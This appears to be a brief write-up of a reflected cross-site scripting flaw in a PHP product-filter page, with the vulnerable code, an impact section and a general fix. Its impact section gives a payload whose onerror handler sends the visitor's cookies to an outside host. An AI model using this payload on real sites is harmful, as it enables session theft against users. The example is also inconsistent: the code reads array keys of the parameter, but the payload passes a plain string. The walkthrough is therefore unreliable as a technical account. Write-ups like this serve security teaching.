## Overview

## Code Analysis
In this writeup, I'll analyze an XSS vulnerability discovered in the filtering mechanism of a search feature.

```php
<?php
$product_filter = $_GET['filter']; // Get the filter parameter from the URL
$products = array(); // Array of products

?>

<!-- Display the filtered products -->
<h2>Filter products</h2>
<?php
    if (isset($product_filter)) {
        echo "<p>You're currently filtering by \"" . implode('", "', array_keys($product_filter)) . "\"</p>";
    }
?>
```
Here is the vulnerability. The `product_filter` parameter is directly used in the `implode` function without proper validation or sanitization.

## Impact
An attacker can craft a malicious URL with a payload that includes JavaScript code, which will be executed in the context of the website. For example, a payload like `?filter=<img src=x onerror=fetch('https://vuln.me/?cookie='+document.cookie)>` would trigger an XSS attack when the page is loaded.

## Solving the Issue
To prevent XSS attacks, it is important to properly sanitize and validate user input before using it in dynamic content. In this case, the `product_filter` parameter should be sanitized and validated before being used in the `implode` function.
